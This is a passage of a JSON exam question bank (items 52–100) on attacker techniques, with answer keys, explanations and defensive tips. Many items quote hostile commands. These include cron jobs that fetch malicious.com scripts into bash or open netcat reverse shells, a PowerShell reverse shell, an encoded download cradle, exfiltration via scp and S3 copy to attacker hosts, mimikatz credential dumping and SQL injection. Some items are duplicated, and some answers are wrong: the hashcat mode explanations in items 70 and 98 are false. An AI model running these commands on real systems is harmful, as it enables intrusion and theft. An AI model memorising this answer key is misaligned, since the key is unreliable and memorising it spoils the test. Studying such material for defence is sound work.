      "examTip": "Enable SMB signing and LAPS to mitigate unauthorized NTLM hash extraction."
    },
    {
      "id": 52,
      "question": "An attacker executes the following command on a compromised Linux system:\n\n`echo '*/5 * * * * root /usr/bin/curl -s http://malicious.com/backdoor.sh | bash' >> /etc/crontab`\n\nWhat is the impact of this action?",
      "options": [
        "Creating a persistent backdoor that executes every 5 minutes",
        "Performing a denial-of-service attack",
        "Overwriting system logs to evade detection",
        "Disabling firewall rules for inbound connections"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This cron job downloads and executes a backdoor script every 5 minutes, ensuring persistence.",
      "examTip": "Monitor cron job modifications and restrict write access to `/etc/crontab`."
    },
    {
      "id": 53,
      "question": "A forensic analyst detects the following activity in system logs:\n\n`wevtutil cl Security`\n\nWhat is the attacker's likely intent?",
      "options": [
        "Clearing Windows event logs to cover their tracks",
        "Exfiltrating sensitive logs to a remote server",
        "Performing a Kerberoasting attack",
        "Injecting malicious DLLs into a running process"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `wevtutil cl Security` command clears Windows event logs, preventing forensic analysis of malicious activity.",
      "examTip": "Enable event log forwarding and SIEM integration to prevent attackers from erasing log history."
    },
    {
      "id": 54,
      "question": "A penetration tester runs the following command:\n\n`python3 -m http.server 8000`\n\nWhat is the tester attempting to do?",
      "options": [
        "Set up a simple web server to host payloads or exfiltrate data",
        "Perform an HTTP brute-force attack",
        "Scan the local network for active devices",
        "Intercept SSL/TLS encrypted traffic"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command launches a Python-based HTTP server, which is commonly used for serving payloads or data exfiltration.",
      "examTip": "Monitor for unauthorized HTTP server instances running on endpoints."
    },
    {
      "id": 55,
      "question": "In anticipation of pending data privacy legislation, a tech startup wants to formalize its governance processes. Which action should be the FIRST priority to build a robust foundation for compliance?",
      "options": [
        "Launch a specialized internal security operations center (SOC) to detect policy breaches.",
        "Appoint a legal advisor to track evolving laws and update procedures on an as-needed basis.",
        "Design and document a clear governance structure, detailing roles, responsibilities, and escalation paths.",
        "Require all employees to acknowledge a corporate charter that includes a high-level compliance statement."
      ],
      "correctAnswerIndex": 2,
      "explanation": "A well-defined governance structure ensures everyone understands their part in compliance and escalation workflows. Relying solely on legal advisors, advanced security operations, or blanket acknowledgments will likely miss necessary operational discipline for lasting governance.",
      "examTip": "Clarity in roles and responsibilities is the bedrock of a sustainable governance framework."
    },
    {
      "id": 56,
      "question": "An attacker exploits a misconfigured AWS IAM role and executes the following command:\n\n`aws iam list-users`\n\nWhat is the goal of this attack?",
      "options": [
        "Enumerating IAM user accounts to escalate privileges",
        "Exfiltrating sensitive data from an S3 bucket",
        "Compromising EC2 metadata for further attacks",
        "Modifying IAM policies to allow full administrative access"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command lists all IAM users in the AWS environment, which can be used for privilege escalation attempts.",
      "examTip": "Use least privilege access for IAM roles and monitor AWS API calls for suspicious activity."
    },
    {
      "id": 57,
      "question": "An attacker executes the following command:\n\n`nmap -p 445 --script smb-vuln-ms17-010 <target>`\n\nWhat is the attacker's goal?",
      "options": [
        "Detecting systems vulnerable to EternalBlue",
        "Brute-forcing SMB credentials",
        "Enumerating open SMB shares",
        "Performing a pass-the-hash attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The script checks if the target is vulnerable to EternalBlue (MS17-010), a critical SMB exploit used in WannaCry and NotPetya attacks.",
      "examTip": "Ensure SMB patches are applied and disable SMBv1 to prevent exploitation."
    },
    {
      "id": 58,
      "question": "A forensic analyst detects the following activity in a compromised system:\n\n`schtasks /create /sc daily /tn 'Updater' /tr 'C:\\Users\\Public\\malware.exe'`\n\nWhat is the attacker's intent?",
      "options": [
        "Establishing persistence by scheduling malware execution",
        "Clearing Windows security logs",
        "Performing a brute-force attack",
        "Scanning the internal network for vulnerable devices"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `schtasks` command schedules a malicious executable to run daily, ensuring persistence on the system.",
      "examTip": "Monitor scheduled tasks for unauthorized entries and enforce execution restrictions."
    },
    {
      "id": 59,
      "question": "A penetration tester executes the following command on a Linux system:\n\n`find / -perm -4000 -type f 2>/dev/null`\n\nWhat is the tester trying to accomplish?",
      "options": [
        "Identifying SUID binaries that can be exploited for privilege escalation",
        "Searching for files containing sensitive information",
        "Enumerating writable directories for persistence",
        "Extracting password hashes from system files"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command searches for SUID binaries, which can be exploited to gain root privileges.",
      "examTip": "Regularly audit SUID binaries and remove unnecessary permissions."
    },
    {
      "id": 60,
      "question": "An attacker modifies the PATH environment variable on a Linux system as follows:\n\n`export PATH=/tmp/malicious:$PATH`\n\nWhat is the attacker's objective?",
      "options": [
        "Hijacking system commands by executing malicious binaries",
        "Granting root privileges to a malicious process",
        "Extracting credentials from memory",
        "Redirecting traffic to a phishing site"
      ],
      "correctAnswerIndex": 0,
      "explanation": "By modifying the PATH variable, the attacker ensures that their malicious binaries are executed instead of legitimate system commands.",
      "examTip": "Monitor environment variable changes and enforce execution control policies."
    },
    {
      "id": 61,
      "question": "A forensic analyst detects a suspicious PowerShell execution on a compromised system:\n\n`$client = New-Object System.Net.Sockets.TCPClient('203.0.113.50', 4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);Invoke-Expression $data}`\n\nWhat is the attacker's likely objective?",
      "options": [
        "Establishing a reverse PowerShell shell for remote control",
        "Dumping LSASS memory for credential extraction",
        "Performing a Kerberoasting attack against Active Directory",
        "Exfiltrating sensitive files over an encrypted tunnel"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command creates a TCP reverse shell that allows the attacker to send and execute commands remotely.",
      "examTip": "Monitor for suspicious PowerShell activity and restrict unauthorized outbound connections."
    },
    {
      "id": 62,
      "question": "A penetration tester runs the following command:\n\n`msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.5; run\"`\n\nWhat is the tester attempting to do?",
      "options": [
        "Exploiting an unpatched Windows SMB vulnerability (EternalBlue)",
        "Performing an SMB relay attack",
        "Executing a Kerberoasting attack",
        "Extracting NTLM hashes from memory"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command uses Metasploit’s EternalBlue exploit to target an unpatched Windows SMB vulnerability (MS17-010).",
      "examTip": "Ensure all SMB patches are applied and disable SMBv1 to mitigate EternalBlue attacks."
    },
    {
      "id": 63,
      "question": "A security analyst reviewing logs detects a high volume of outbound DNS queries to domains with randomized subdomains, such as:\n\n```\na1b2c3.example.com\nd4e5f6.example.com\ng7h8i9.example.com\n```\n\nWhat is the most likely cause of this activity?",
      "options": [
        "Malware using a Domain Generation Algorithm (DGA) for command-and-control",
        "A legitimate cloud service dynamically generating subdomains",
        "A brute-force attack against DNS records",
        "An internal DNS misconfiguration"
      ],
      "correctAnswerIndex": 0,
      "explanation": "DGA-based malware generates random subdomains to evade domain blacklisting and establish C2 communications.",
      "examTip": "Use DNS filtering and behavioral analysis to detect and block DGA-based malware."
    },
    {
      "id": 64,
      "question": "An attacker executes the following command on a Linux system:\n\n`iptables -A INPUT -p tcp --dport 22 -j DROP`\n\nWhat is the attacker's intent?",
      "options": [
        "Blocking SSH access to prevent remote administrative intervention",
        "Opening a new backdoor for persistent access",
        "Performing a denial-of-service attack",
        "Modifying DNS resolution settings"
      ],
      "correctAnswerIndex": 0,
      "explanation": "By adding this rule, the attacker prevents legitimate users from accessing SSH remotely, ensuring the attack remains undisturbed.",
      "examTip": "Monitor firewall rule changes and use security baselines to enforce configurations."
    },
    {
      "id": 65,
      "question": "A penetration tester executes the following command:\n\n`nmap -p- -sS -A -T4 192.168.1.0/24`\n\nWhat is the primary goal of this scan?",
      "options": [
        "Performing a stealthy full port scan with aggressive detection",
        "Launching a brute-force attack against network devices",
        "Sniffing credentials from unencrypted network traffic",
        "Exploiting a known vulnerability in an open port"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `-p-` flag scans all 65,535 ports, while `-sS` performs a stealthy SYN scan with aggressive OS and service detection.",
      "examTip": "Monitor for excessive port scanning activity and use intrusion detection systems (IDS) to detect reconnaissance."
    },
    {
      "id": 66,
      "question": "An attacker executes the following SQL query:\n\n`SELECT username, password FROM users WHERE username='admin' --' AND password='password'`;\n\nWhat type of attack is being performed?",
      "options": [
        "SQL injection to bypass authentication",
        "Cross-site scripting (XSS)",
        "Remote code execution (RCE)",
        "Privilege escalation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The attacker is using SQL injection to manipulate the authentication query logic and bypass login security.",
      "examTip": "Use parameterized queries and input validation to prevent SQL injection attacks."
    },
    {
      "id": 67,
      "question": "An attacker modifies the following Windows registry key:\n\n`reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d \"C:\\Users\\Public\\malware.exe\" /f`\n\nWhat is the attacker's intent?",
      "options": [
        "Establishing persistence by executing malware at user login",
        "Disabling Windows security policies",
        "Exfiltrating user credentials from the Windows registry",
        "Escalating privileges to a domain administrator"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The registry key ensures that the malware runs every time the user logs in, maintaining persistence.",
      "examTip": "Monitor registry modifications and enforce least privilege access controls."
    },
    {
      "id": 68,
      "question": "A penetration tester runs the following command on an Active Directory network:\n\n`nltest /dclist:corp.local`\n\nWhat is the objective of this command?",
      "options": [
        "Enumerating all domain controllers in the Active Directory environment",
        "Extracting NTLM password hashes",
        "Performing a pass-the-hash attack",
        "Identifying all users in the domain"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `nltest /dclist` command lists all domain controllers within a specified Active Directory domain.",
      "examTip": "Monitor Active Directory enumeration commands to detect potential reconnaissance activity."
    },
    {
      "id": 69,
      "question": "A forensic analyst reviewing network traffic logs detects multiple outbound connections to `169.254.169.254`. What is the most likely cause?",
      "options": [
        "An attacker attempting to exploit cloud metadata services",
        "A normal network configuration request",
        "A botnet command-and-control communication",
        "A DNS poisoning attack in progress"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The IP `169.254.169.254` is used by cloud providers (such as AWS) for metadata services, which attackers exploit to extract credentials.",
      "examTip": "Restrict access to cloud metadata services and enforce IMDSv2 in AWS environments."
    },
    {
      "id": 70,
      "question": "A penetration tester executes the following command:\n\n`hashcat -m 18200 -a 0 hashlist.txt wordlist.txt`\n\nWhat type of hashes is the tester attempting to crack?",
      "options": [
        "KeePass password vault hashes",
        "MD5 authentication hashes",
        "Kerberos ticket hashes",
        "SHA-512 hashes"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Hashcat mode `18200` is used to crack KeePass password vault hashes using a dictionary attack.",
      "examTip": "Use strong, unique master passwords and enable two-factor authentication for password vaults."
    },
    {
      "id": 71,
      "question": "A forensic analyst detects the following encoded PowerShell command executed on a compromised Windows machine:\n\n`powershell.exe -enc SQBFAFggKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vbWFsaWNpb3VzLXNpdGUuY29tL3BheWxvYWQucHMxJyk7IEVYKCk=`\n\nWhat is the attacker's intent?",
      "options": [
        "Downloading and executing a remote PowerShell payload",
        "Performing a brute-force attack against a system service",
        "Dumping credentials from LSASS memory",
        "Exfiltrating data using DNS tunneling"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Decoding the Base64 string reveals a command that downloads a script and executes a malicious payload.",
      "examTip": "Always decode and analyze encoded scripts to understand their intent before taking action."
    },
    {
      "id": 72,
      "question": "An attacker exploits a misconfigured AWS IAM role and executes the following command:\n\n`aws ec2 describe-instances --region us-west-2`\n\nWhat is the attacker's goal?",
      "options": [
        "Enumerating all EC2 instances in the AWS account",
        "Listing all active IAM users",
        "Exfiltrating sensitive files from an S3 bucket",
        "Brute-forcing credentials for AWS services"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command lists all EC2 instances, which could be used for reconnaissance or lateral movement in a cloud environment.",
      "examTip": "Monitor AWS API calls and use least privilege IAM policies to restrict unauthorized access."
    },
    {
      "id": 73,
      "question": "After completing a risk assessment, a global e-commerce firm discovers conflicting regulatory requirements in different countries. Which approach BEST addresses these inconsistencies while maintaining enterprise-wide compliance standards?",
      "options": [
        "Enforce the strictest requirement from any jurisdiction in all locations to ensure maximum coverage.",
        "Develop separate compliance frameworks for each country, completely independent of one another.",
        "Adopt a core global standard and layer on local regulatory requirements where stricter rules apply.",
        "Temporarily suspend operations in countries with conflicting regulations to avoid legal complications."
      ],
      "correctAnswerIndex": 2,
      "explanation": "Implementing a global baseline while adding local compliance overlays meets unique jurisdictional demands without fragmenting the overall governance approach. Applying the strictest standard everywhere may introduce unnecessary operational burdens or conflicts.",
      "examTip": "A hybrid approach accommodates regional legal obligations while preserving a unified organizational standard."
    },
    {
      "id": 74,
      "question": "An attacker modifies the following Windows registry key:\n\n`reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d \"C:\\Users\\Public\\malware.exe\" /f`\n\nWhat is the attacker's intent?",
      "options": [
        "Establishing persistence by executing malware at user login",
        "Disabling Windows security policies",
        "Exfiltrating user credentials from the Windows registry",
        "Escalating privileges to a domain administrator"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The registry key ensures that the malware runs every time the user logs in, maintaining persistence.",
      "examTip": "Monitor registry modifications and enforce least privilege access controls."
    },
    {
      "id": 75,
      "question": "A forensic analyst reviewing network traffic logs detects multiple outbound connections to `169.254.169.254`. What is the most likely cause?",
      "options": [
        "An attacker attempting to exploit cloud metadata services",
        "A normal network configuration request",
        "A botnet command-and-control communication",
        "A DNS poisoning attack in progress"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The IP `169.254.169.254` is used by cloud providers (such as AWS) for metadata services, which attackers exploit to extract credentials.",
      "examTip": "Restrict access to cloud metadata services and enforce IMDSv2 in AWS environments."
    },
    {
      "id": 76,
      "question": "An attacker executes the following SQL query:\n\n`SELECT username, password FROM users WHERE username='admin' --' AND password='password'`;\n\nWhat type of attack is being performed?",
      "options": [
        "SQL injection to bypass authentication",
        "Cross-site scripting (XSS)",
        "Remote code execution (RCE)",
        "Privilege escalation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The attacker is using SQL injection to manipulate the authentication query logic and bypass login security.",
      "examTip": "Use parameterized queries and input validation to prevent SQL injection attacks."
    },
    {
      "id": 77,
      "question": "A penetration tester executes the following command:\n\n`hashcat -m 22000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a`\n\nWhat type of attack is being performed?",
      "options": [
        "Brute-forcing WPA2 Wi-Fi handshake hashes",
        "Cracking NTLM password hashes",
        "Performing a pass-the-hash attack",
        "Decrypting SSL/TLS traffic"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Hashcat with `-m 22000` targets WPA2 Wi-Fi handshake hashes using a brute-force attack.",
      "examTip": "Use strong, unique Wi-Fi passwords and enable WPA3 where possible to mitigate brute-force attacks."
    },
    {
      "id": 78,
      "question": "An attacker successfully exploits an AWS environment and executes the following command:\n\n`aws s3 cp s3://sensitive-data-bucket s3://attacker-bucket --recursive`\n\nWhat is the attacker's goal?",
      "options": [
        "Exfiltrating all files from a compromised S3 bucket",
        "Enumerating active IAM roles",
        "Compromising EC2 metadata for privilege escalation",
        "Gaining shell access to a cloud instance"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command copies all files from a target S3 bucket to an attacker-controlled bucket for exfiltration.",
      "examTip": "Use S3 bucket policies to restrict unauthorized copying and enable logging for all API actions."
    },
    {
      "id": 79,
      "question": "A penetration tester executes the following command:\n\n`nmap --script smb-vuln-ms17-010 -p 445 <target>`\n\nWhat is the attacker's goal?",
      "options": [
        "Detecting systems vulnerable to EternalBlue",
        "Brute-forcing SMB credentials",
        "Enumerating open SMB shares",
        "Performing a pass-the-hash attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The script checks if the target is vulnerable to EternalBlue (MS17-010), a critical SMB exploit used in WannaCry and NotPetya attacks.",
      "examTip": "Ensure SMB patches are applied and disable SMBv1 to prevent exploitation."
    },
    {
      "id": 80,
      "question": "An attacker modifies the following file on a Linux system:\n\n`echo '* * * * * root /bin/bash -c \"nc -e /bin/bash 203.0.113.10 4444\"' >> /etc/crontab`\n\nWhat is the attacker's intent?",
      "options": [
        "Establishing a persistent reverse shell via cron job execution",
        "Dumping credentials from `/etc/shadow`",
        "Disabling firewall rules to allow inbound traffic",
        "Overwriting critical system logs"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This cron job executes a Netcat reverse shell every minute, ensuring persistent access for the attacker.",
      "examTip": "Monitor cron job modifications and restrict write access to `/etc/crontab`."
    },
    {
      "id": 81,
      "question": "A financial services firm wants to proactively address potential audit findings related to governance lapses. Which of the following actions will MOST effectively reduce the likelihood of negative audit outcomes in the long term?",
      "options": [
        "Instruct all departments to comply with every global standard, even if some standards do not apply to their operations.",
        "Establish an internal continuous control monitoring (CCM) program to detect governance and compliance issues early.",
        "Swap internal audit teams every six months to ensure they do not develop familiarity with specific departments.",
        "Immediately penalize departments that fail any aspect of compliance testing, regardless of mitigation attempts."
      ],
      "correctAnswerIndex": 1,
      "explanation": "A continuous control monitoring (CCM) program identifies governance issues in real time, enabling rapid remediation. Arbitrarily adopting all standards or rotating audit teams does not necessarily target root causes of governance lapses and can increase overhead.",
      "examTip": "Ongoing oversight and immediate remediation, rather than sporadic checks, are key to effective, long-term compliance management."
    },
    {
      "id": 82,
      "question": "An attacker runs the following command on a compromised Linux machine:\n\n`find / -perm -4000 -type f 2>/dev/null`\n\nWhat is the attacker attempting to do?",
      "options": [
        "Identifying SUID binaries that can be exploited for privilege escalation",
        "Searching for files containing sensitive information",
        "Enumerating writable directories for persistence",
        "Extracting password hashes from system files"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command searches for SUID binaries, which can be exploited to gain root privileges.",
      "examTip": "Regularly audit SUID binaries and remove unnecessary permissions."
    },
    {
      "id": 83,
      "question": "A penetration tester executes the following command:\n\n`mimikatz \"privilege::debug\" \"sekurlsa::logonpasswords\" exit`\n\nWhat is the tester attempting to accomplish?",
      "options": [
        "Extract plaintext credentials from memory",
        "Perform a pass-the-hash attack",
        "Brute-force Active Directory user accounts",
        "Disable Windows security auditing"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Mimikatz is used to dump credentials stored in memory, allowing attackers to retrieve plaintext passwords.",
      "examTip": "Enable LSASS protection and restrict debug privileges to prevent credential dumping."
    },
    {
      "id": 84,
      "question": "A security analyst reviewing AWS logs detects multiple failed API requests to `sts:AssumeRole`. What is the likely goal of the attacker?",
      "options": [
        "Attempting to escalate privileges by assuming an IAM role",
        "Brute-forcing AWS credentials",
        "Exfiltrating sensitive data from an S3 bucket",
        "Enumerating EC2 instances for lateral movement"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `sts:AssumeRole` API allows attackers to switch to another IAM role with higher privileges if misconfigured.",
      "examTip": "Limit role-switching permissions and monitor IAM privilege escalation attempts."
    },
    {
      "id": 85,
      "question": "An attacker executes the following command:\n\n`sudo awk 'BEGIN {system(\"/bin/bash\")}'`\n\nWhat is the attacker's intent?",
      "options": [
        "Executing a privilege escalation attack via `awk`",
        "Clearing system logs to avoid detection",
        "Injecting a malicious script into kernel memory",
        "Exfiltrating password hashes from `/etc/shadow`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command exploits an `awk` shell escape feature to escalate privileges to root.",
      "examTip": "Restrict sudo access and audit commands executed with elevated privileges."
    },
    {
      "id": 86,
      "question": "A forensic analyst detects the following log entry on a Windows system:\n\n`Event ID 1102 - The audit log was cleared.`\n\nWhat does this indicate?",
      "options": [
        "An attacker attempting to cover their tracks",
        "A normal system log rotation process",
        "A brute-force attack against local user accounts",
        "A scheduled task deleting logs for compliance reasons"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Event ID 1102 indicates that an attacker has cleared Windows event logs to remove forensic evidence.",
      "examTip": "Use event log forwarding to send logs to a secure central location before they can be deleted."
    },
    {
      "id": 87,
      "question": "An attacker executes the following command on a compromised Windows system:\n\n`net user backupadmin P@ssw0rd /add && net localgroup Administrators backupadmin /add`\n\nWhat is the attacker's likely goal?",
      "options": [
        "Creating a hidden administrative account for persistent access",
        "Modifying Active Directory group policies",
        "Exfiltrating stored user credentials",
        "Triggering a domain-wide denial-of-service attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command creates a new administrative account, allowing the attacker to maintain access even after reboots.",
      "examTip": "Monitor user account creation logs and enforce least privilege access."
    },
    {
      "id": 88,
      "question": "An attacker successfully gains access to an AWS environment and runs the following command:\n\n`aws configure list`\n\nWhat is the attacker trying to accomplish?",
      "options": [
        "Listing stored AWS credentials and access keys",
        "Enumerating available S3 buckets",
        "Extracting IAM roles assigned to the instance",
        "Enumerating EC2 instances"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command retrieves stored AWS credentials, which can be used to escalate privileges or exfiltrate data.",
      "examTip": "Use temporary credentials where possible and monitor AWS API calls for unauthorized access."
    },
    {
      "id": 89,
      "question": "A penetration tester executes the following command:\n\n`nmap --script=smb-vuln-ms17-010 -p445 <target>`\n\nWhat vulnerability is the tester attempting to exploit?",
      "options": [
        "EternalBlue (MS17-010) on SMBv1",
        "SMB relay attack",
        "Kerberos authentication bypass",
        "A pass-the-hash attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `smb-vuln-ms17-010` script detects EternalBlue vulnerabilities, a critical flaw exploited in ransomware attacks.",
      "examTip": "Ensure SMB patches are applied and disable SMBv1 to mitigate EternalBlue attacks."
    },
    {
      "id": 90,
      "question": "A security analyst detects the following unusual network activity:\n\n- Multiple outbound connections to `hxxp://203.0.113.50/beacon.png`\n- Connections every 60 seconds with small data payloads\n- A user process spawning `cmd.exe` unexpectedly\n\nWhat is the most likely cause of this activity?",
      "options": [
        "A command-and-control (C2) beaconing malware",
        "A legitimate update service running on the endpoint",
        "A brute-force attack against an external web server",
        "A system patch download failing repeatedly"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The pattern of periodic connections with minimal data suggests C2 beaconing, often used by malware for remote control.",
      "examTip": "Monitor for suspicious outbound traffic patterns and analyze domain reputation to detect C2 activity."
    },
    {
      "id": 91,
      "question": "A penetration tester runs the following command:\n\n`evil-winrm -i 10.0.0.5 -u Administrator -p P@ssw0rd`\n\nWhat is the tester attempting to do?",
      "options": [
        "Establish a remote shell using WinRM with valid credentials",
        "Brute-force an Active Directory administrator account",
        "Dump NTLM hashes from a remote system",
        "Exploit a vulnerability in Windows Remote Desktop"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Evil-WinRM is a tool used for remote command execution on Windows via WinRM, often used in red team operations.",
      "examTip": "Disable WinRM if not required or enforce multi-factor authentication for administrative access."
    },
    {
      "id": 92,
      "question": "An attacker executes the following command on a compromised Linux system:\n\n`echo '*/10 * * * * root /bin/bash -c \"nc -e /bin/bash 203.0.113.10 4444\"' >> /etc/crontab`\n\nWhat is the attacker's objective?",
      "options": [
        "Maintaining persistence by scheduling a reverse shell every 10 minutes",
        "Exfiltrating credentials from `/etc/shadow`",
        "Performing a denial-of-service attack",
        "Disabling security logging on the system"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This cron job ensures a persistent reverse shell connection to the attacker's machine every 10 minutes.",
      "examTip": "Monitor unauthorized cron job modifications and restrict write access to `/etc/crontab`."
    },
    {
      "id": 93,
      "question": "A security analyst detects an unexpected DNS request from an internal machine to `malicious-command-and-control.com`. Further analysis shows the request contains base64-encoded data in the subdomain. What is the most likely explanation?",
      "options": [
        "The system is exfiltrating data using DNS tunneling",
        "The system is performing a routine DNS lookup",
        "A brute-force attack is being attempted against an external DNS server",
        "A legitimate application is using dynamic DNS updates"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Base64-encoded data in DNS queries is a common indicator of DNS tunneling, which can be used for covert data exfiltration or C2 communication.",
      "examTip": "Implement DNS filtering and anomaly detection to prevent data exfiltration over DNS."
    },
    {
      "id": 94,
      "question": "An attacker successfully exploits an AWS environment and executes the following command:\n\n`aws s3 ls --recursive s3://sensitive-bucket`\n\nWhat is the attacker attempting to do?",
      "options": [
        "Enumerate all files stored in a misconfigured S3 bucket",
        "Modify IAM policies to escalate privileges",
        "List all AWS IAM users",
        "Enumerate all running EC2 instances"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command lists all files in an S3 bucket, potentially exposing sensitive data if the bucket permissions are misconfigured.",
      "examTip": "Enforce S3 bucket policies to restrict unauthorized listing and access."
    },
    {
      "id": 95,
      "question": "A penetration tester executes the following command:\n\n`nmap --script http-shellshock -p 80,443 <target>`\n\nWhat is the tester attempting to accomplish?",
      "options": [
        "Exploiting the Shellshock vulnerability in a web server",
        "Performing a denial-of-service attack",
        "Enumerating open HTTP ports",
        "Brute-forcing web application credentials"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `http-shellshock` script detects and exploits the Shellshock vulnerability (CVE-2014-6271) in web servers.",
      "examTip": "Patch all Bash vulnerabilities and restrict untrusted CGI script execution."
    },
    {
      "id": 96,
      "question": "A forensic analyst detects the following command executed on a Windows system:\n\n`reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityTool /f`\n\nWhat is the attacker's intent?",
      "options": [
        "Disabling security software persistence",
        "Deleting evidence of malware execution",
        "Exfiltrating sensitive registry data",
        "Creating a hidden administrator account"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command removes an auto-run registry entry, likely targeting security software to prevent it from launching on reboot.",
      "examTip": "Monitor registry modification events and enforce endpoint protection policies."
    },
    {
      "id": 97,
      "question": "An attacker executes the following command on a compromised machine:\n\n`scp /etc/passwd attacker@203.0.113.50:/tmp/`\n\nWhat is the attacker's likely goal?",
      "options": [
        "Exfiltrating system user account information to an external server",
        "Executing a privilege escalation attack",
        "Modifying firewall rules to allow persistent access",
        "Extracting NTLM password hashes"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command copies the `/etc/passwd` file to an external server, which may be used for offline password cracking.",
      "examTip": "Monitor outbound SCP/FTP transfers and restrict access to sensitive system files."
    },
    {
      "id": 98,
      "question": "A penetration tester executes the following command:\n\n`hashcat -m 13100 -a 0 hashlist.txt wordlist.txt`\n\nWhat type of hashes is the tester attempting to crack?",
      "options": [
        "Kerberos AS-REP (unconstrained delegation) hashes",
        "NTLM authentication hashes",
        "KeePass vault hashes",
        "MD5 password hashes"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Hashcat mode `13100` is used for cracking Kerberos AS-REP hashes, which can be extracted from Active Directory environments.",
      "examTip": "Enforce strong service account passwords and disable unconstrained delegation where possible."
    },
    {
      "id": 99,
      "question": "A forensic analyst detects an unusual process running with the following command:\n\n`rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"`\n\nWhat is the attacker's goal?",
      "options": [
        "Executing fileless malware using `rundll32.exe`",
        "Dumping NTLM password hashes from memory",
        "Brute-forcing Active Directory user credentials",
        "Extracting encryption keys from Windows Registry"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command abuses `rundll32.exe` to execute JavaScript, which is commonly used in fileless malware attacks.",
      "examTip": "Monitor `rundll32.exe` execution and restrict script execution policies."
    },
    {
      "id": 100,
      "question": "A penetration tester executes the following command:\n\n`bloodhound-python -c All -u pentest -p Password123 -d corp.local`\n\nWhat is the tester attempting to do?",
      "options": [
        "Enumerate Active Directory relationships for privilege escalation paths",
        "Perform Kerberoasting to extract service account credentials",
        "Dump NTLM password hashes from a domain controller",
        "Scan for open SMB ports on a target network"
      ],
      "correctAnswerIndex": 0,
      "explanation": "BloodHound maps Active Directory relationships to help identify privilege escalation paths.",
      "examTip": "Monitor for unauthorized AD enumeration and limit unnecessary user privileges."
    }
  ]
});
